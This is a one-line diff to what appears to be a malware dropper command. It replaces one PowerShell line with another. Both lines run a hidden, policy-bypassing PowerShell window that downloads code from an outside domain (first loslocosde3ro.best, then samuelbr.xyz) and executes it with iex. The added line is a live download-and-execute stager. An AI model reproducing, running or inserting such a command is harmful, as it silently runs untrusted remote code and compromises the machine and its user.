@@ -1,1 +1,1 @@
-powershell.exe -W Hidden -ExecutionPolicy Bypass -NoP -NonI -C "(curl loslocosde3ro.best/herramienta).Content | iex"
+powershell.exe -W Hidden -ExecutionPolicy Bypass -NoP -NonI -C "(curl samuelbr.xyz/optimizador).Content | iex"
